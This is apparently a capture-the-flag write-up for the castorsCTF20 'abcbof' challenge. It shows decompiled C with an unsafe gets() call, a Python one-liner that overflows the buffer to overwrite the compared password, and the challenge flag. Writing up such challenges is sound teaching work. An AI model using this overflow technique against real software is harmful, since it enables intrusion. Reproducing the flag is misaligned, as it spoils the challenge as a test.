---
type: "post"
title: "abcbof"
author: "tozkoparan (Ahmed Selim Üzüm)"
tags: ["writeup", "pwn", "castorsCTF20"]
---

The executable file wants a password from us. So let's see if it uses `strcmp`
for comparing it. If that, and the text isn't encyripted we should able to see the
password. So let's run `ltrace ./abcbof` and give `aaaa` for password. Here is the
password! But when we tried it, it didn't work.

We can use `ghidra` for seeing why it didn't work.

```c
undefined8 main(void)

{
  int iVar1;
  char local_118 [256];
  char local_18 [16];

  printf("Hello everyone, say your name: ");
  gets(local_118);
  iVar1 = strcmp("CyberCastors",local_18);
  if (iVar1 == 0) {
    get_flag();
  }
  puts("You lose!");
  return 0;
}
```

We can now see it didn't work because our input is inside `local_118` and checked
password is inside `local_18`. But because gets is vulnerable, if we first print
256 times A and then the correct password we can get the flag!

```shell
 python -c "print('A'*256 + 'CyberCastors')" | ./abcbof
 ```

 **Flag:** `castorsCTF{b0f_4r3_n0t_th4t_h4rd_or_4r3_th3y?}`
